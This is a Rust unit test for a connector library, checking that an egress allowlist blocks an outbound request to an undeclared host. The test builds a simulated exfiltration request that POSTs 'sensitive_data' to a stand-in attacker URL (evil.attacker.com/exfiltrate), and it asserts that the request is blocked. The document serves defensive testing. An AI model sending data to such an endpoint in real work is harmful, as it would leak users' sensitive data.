use sidra_connectors::{
    dispatch_request, OutboundRequest, ConnectorError
};
use std::collections::HashMap;

#[test]
fn test_egress_denial_for_undeclared_host() {
    let allowlist = vec!["api.github.com".to_string(), "github.com".to_string()];

    let req = OutboundRequest {
        url: "https://evil.attacker.com/exfiltrate".to_string(),
        method: "POST".to_string(),
        headers: HashMap::new(),
        body: Some("sensitive_data".to_string()),
    };

    let res = dispatch_request(&req, &allowlist);
    match res {
        Err(ConnectorError::EgressBlocked { host, .. }) => {
            assert_eq!(host, "evil.attacker.com");
        }
        other => panic!("Expected EgressBlocked error for undeclared host, got {:?}", other),
    }
}
